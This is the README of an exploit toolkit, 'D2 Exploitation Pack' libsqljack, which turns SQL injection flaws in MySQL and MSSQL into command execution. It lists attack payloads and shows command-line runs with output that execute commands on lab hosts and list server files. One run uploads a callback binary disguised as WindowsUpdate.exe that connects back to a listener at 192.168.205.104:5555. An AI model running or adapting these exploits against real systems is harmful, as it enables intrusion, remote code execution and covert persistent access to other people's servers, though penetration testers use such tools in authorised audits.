D2 Exploitation Pack

Copyright (c) 2007-2010 DSquare Security, LLC
All rights reserved.

License information
---------------------

See the file "LICENSE.txt" for information on the history of this
software, terms & conditions for usage, and a DISCLAIMER OF ALL
WARRANTIES.

Description
-------------

libsqljack is a library to transform a sql injection vulnerability to a
command execution. This library support MySQL and MSSQL database server at this
moment.

Two exploits (exploit_demo_mysql.py and exploit_demo_mssql.py) are given to
demonstrate how to use this library and a first exploit
(d2sec_phptroubleticket.py) to exploit a real sql injection vulnerability.

Usage with exploit_demo_mysql.py for example :

$ python exploit_demo_mssql.py -h
Usage: exploit_demo_mssql.py [options] <URL> <CMD>

Options:
  -h, --help            show this help message and exit
  -p NAME, --payload=NAME
                        Payload to use
  -v LEVEL, --verbosity=LEVEL
                        From 1 (quiet) to 5 (debug). Default: 4


Payloads list for MSSQL:
- exec_via_file
- exec_via_file_reconf
- exec_via_file_extproc
- exec_via_table (default)
- exec_upload_via_table

Payloads list for MySQL:
- exec_via_lib_linux (default)
- exec_via_lib_windows
- exec_via_file


With the default payload (payload exec_via_table - see payload_default() in
payloads_mssql.py):

$ ./exploit_demo_mssql.py http://auditor-win2k3/pwnasp/backdoor.asp hostname 
INFO     exploit              - Exploiting host: http://auditor-win2k3/pwnasp/backdoor.asp
INFO     default              - Executing command ...
INFO     default              - Fetching command output ...
INFO     default              - Cleaning temporary data ...
INFO     exploit              - Exploit result:
w2k3sp2en

With verbose level 5 :

$ ./exploit_demo_mssql.py http://auditor-win2k3/pwnasp/backdoor.asp hostname -v 5
INFO     exploit              - Exploiting host: http://auditor-win2k3/pwnasp/backdoor.asp
INFO     default              - Executing command ...
DEBUG    exploit              - Sending "mssql_exec" payload of 90 bytes ...
DEBUG    exploit              - Sending "mssql_exec" payload of 61 bytes ...
INFO     default              - Fetching command output ...
DEBUG    exploit              - Sending "mssql_inject" payload of 102 bytes ...
DEBUG    exploit              - Sending "mssql_inject" payload of 102 bytes ...
INFO     default              - Cleaning temporary data ...
DEBUG    exploit              - Sending "mssql_exec" payload of 24 bytes ...
INFO     exploit              - Exploit result:
w2k3sp2en

With payload exec_via_file (see payload_exec_via_file() in payloads_mssql.py):

$ ./exploit_demo_mssql.py http://auditor-win2k3/pwnasp/backdoor.asp hostname -p exec_via_file
INFO     exploit              - Exploiting host: http://auditor-win2k3/pwnasp/backdoor.asp
ERROR    exec_via_file        - No output path specified. Aborting ...
Example: exploit_demo_mssql.py <URL> <CMD> -p exec_via_file 'C:\inetpub\wwwroot'

INFO     exploit              - Exploit result:

$ ./exploit_demo_mssql.py http://auditor-win2k3/pwnasp/backdoor.asp hostname -p exec_via_file 'C:\inetpub\auditor\pwnasp' -v 5
INFO     exploit              - Exploiting host: http://auditor-win2k3/pwnasp/backdoor.asp
DEBUG    exploit              - Sending "mssql_exec" payload of 81 bytes ...
DEBUG    exploit              - Sending "mssql_exec" payload of 75 bytes ...
INFO     exploit              - Exploit result:
w2k3sp2en

To upload a mosdef callback binary and to run it with payload
exec_upload_via_table from a Linux box:

$ ./exploit_demo_mssql.py http://auditor-win2k3/pwnasp/backdoor.asp mosdef.exe -p exec_upload_via_table /tmp/mosdef.exe 192.168.205.104 5555
INFO     exploit              - Exploiting host: http://auditor-win2k3/pwnasp/backdoor.asp
INFO     exec_upload_via_table - Uploading file /tmp/mosdef.exe ...
.......................
INFO     exec_upload_via_table - Uploaded OK. Executing WindowsUpdate.exe 192.168.205.104 5555 ...

An example with exploit_demo_mysql.py :

$ ./exploit_demo_mysql.py http://192.168.116.135/sqli.php 'ls -alp'
INFO     exploit              - Exploiting host: http://192.168.116.135/sqli.php
INFO     default              - Writing dynamic library (mysql_udf/lib_mysqludf_sys.so) ...
INFO     default              - Creating new function ...
INFO     default              - Fetching command output length...
INFO     default              - Fetching command output ...
..............................
INFO     exploit              - Exploit result:
total 20536
drwxr-xr-x  3 mysql mysql     4096 Feb 16 10:38 ./
drwxr-xr-x 27 root  root      4096 Dec 14 08:22 ../
-rw-r--r--  1 root  root         0 Dec 14 08:22 debian-5.0.flag
-rw-rw----  1 mysql mysql  5242880 Feb 16 10:38 ib_logfile0
-rw-rw----  1 mysql mysql  5242880 Dec 14 08:22 ib_logfile1
-rw-rw----  1 mysql mysql 10485760 Feb 13 13:14 ibdata1
drwxr-xr-x  2 mysql root      4096 Dec 14 08:22 mysql/
-rw-------  1 root  root         7 Dec 14 08:22 mysql_upgrade_info
